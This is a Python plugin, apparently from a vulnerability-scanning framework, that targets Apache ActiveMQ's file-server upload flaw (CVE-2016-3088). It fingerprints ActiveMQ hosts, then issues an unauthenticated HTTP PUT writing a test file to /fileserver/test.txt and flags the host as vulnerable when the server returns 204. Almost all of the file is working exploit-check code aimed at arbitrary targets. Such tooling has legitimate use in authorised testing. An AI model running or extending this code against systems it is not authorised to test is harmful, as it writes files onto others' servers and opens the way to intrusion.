# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-06 21:45
from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import BugType, BugLevel
from core.MyAsyncHttp import *


class Script(BaseScript):
    name = 'ActiveMQ'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.UPLOADFILE
        # 编号
        self.bugNumber = 'CVE-2016-3088'
        # 来源
        self.refer = 'https://paper.seebug.org/346/'
        # http session
        self.session = session
        # 特定路径判断
        self.detectPathList = ['/']
        # exec
        self.execPathList = ['/fileserver/test.txt']
        # exec
        # 相关信息
        self.info = ''

    async def detect(self):
        try:
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    text = await response.text()
                    if 'ActiveMQ' in text:
                        self.flag = True
                        tqdm.write(Fore.RED + '[{}] {}'.format('ActiveMQ Finger', url))
                        return {'name': 'ActiveMQ Finger', 'url': url, 'software': 'ActiveMQ'}
        except Exception:
            return None

    async def exec(self):
        try:
            for execPath in self.execPathList:
                url = f'http://{self.target}{execPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{execPath}'
                data = 'test'
                async with self.session.put(url=url, timeout=self.reqTimeout, verify_ssl=False, data=data) as response:
                    status = response.status
                    if status == 204:
                        tqdm.write(Fore.RED + '[{}] {}'.format('ActiveMQ PUT FILE', url))
                        return {'name': 'ActiveMQ PUT FILE', 'url': url, 'software': 'ActiveMQ'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
                if self.flag:
                    b = await self.exec()
                    if b is not None:
                        self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    pass
    # sem = asyncio.Semaphore(500)
    # sc = Script('192.168.4.137:8161', 1, sem)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack())
